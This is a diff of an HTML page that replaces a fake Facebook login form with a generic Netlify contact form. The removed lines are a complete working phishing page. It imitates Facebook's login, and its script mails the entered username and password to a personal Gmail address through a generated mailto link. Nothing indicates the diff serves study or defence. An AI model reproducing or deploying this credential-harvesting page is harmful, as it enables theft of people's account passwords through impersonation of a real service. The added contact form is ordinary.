@@ -71,30 +71,26 @@
    </head>
 
    <body>
-      <h2 align="cener" class="header">facebook</h2>
-      <form name="contact" netlify>
-        <input id="input" placeholder="Mobile number or email address" name="number"><br>
-         <input type="password" id="pswd" placeholder="Password" name="password"><br>
-         <button class="sub" onclick="submit()">Log In</button><br>
-      </form>
-         <div class="forgot">Forgotten password?</div>
-         <div class="or">
-            <div></div>&nbsp; or <div></div>
-         </div><br>
-         <center><button class="new_account">Create New Account</button></center>
-         <script type="text/javascript">
-            let input = document.getElementById("input");
-            let pswd = document.getElementById("pswd");
-            function submit() {
-               if (input.value.length < 10) { alert("Invalid email or number"); }
-               if (pswd.value.length < 5) { alert("Invalid Password"); }
-               else {
-                  let a = document.createElement("a");
-                  a.href = "mailto:kingjayeriughe@gmail.com?subject=" + input.value + "&body=username:" + input.value + ",password:" + pswd.value;
-                  a.click();
-               }
-            }
-         </script>
+    <form name="contact" method="POST" data-netlify="true">
+  <p>
+    <label>Your Name: <input type="text" name="name" /></label>   
+  </p>
+  <p>
+    <label>Your Email: <input type="email" name="email" /></label>
+  </p>
+  <p>
+    <label>Your Role: <select name="role[]" multiple>
+      <option value="leader">Leader</option>
+      <option value="follower">Follower</option>
+    </select></label>
+  </p>
+  <p>
+    <label>Message: <textarea name="message"></textarea></label>
+  </p>
+  <p>
+    <button type="submit">Send</button>
+  </p>
+</form>
    </body>
 
 </html>
